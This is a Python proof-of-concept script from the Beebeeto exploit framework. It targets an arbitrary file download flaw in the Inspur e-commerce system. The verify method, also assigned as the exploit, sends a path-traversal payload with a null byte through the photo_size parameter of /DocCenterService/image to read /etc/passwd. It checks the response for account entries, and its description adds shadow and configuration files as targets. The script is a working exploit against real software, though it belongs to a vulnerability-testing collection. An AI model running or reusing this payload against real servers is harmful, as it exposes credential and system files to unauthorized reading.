#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0115',
            'name': '浪潮电商系统 /DocCenterService/image?photo_size 任意文件下载漏洞 POC',
            'author': 'xiangshou',
            'create_date': '2015-06-26',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '浪潮电商系统',
            'vul_version': '*',
            'type': 'Arbitrary File Download',
            'tag': ['浪潮电商系统漏洞', '任意文件下载漏洞', '/DocCenterService/image'],
            'desc': ('首先确保photo_id的数字对应的图片存在，之后修改photo_size的值导致下载任意文件'
                     '（包括passwd、shadow、还有各类敏感配置文件）'),
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-093845',
            ]
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ('/DocCenterService/image?photo_id=1&photo_size=../../../..'
                   '/../../../../../../etc/passwd%00')
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'root:' in content and 'nobody:' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())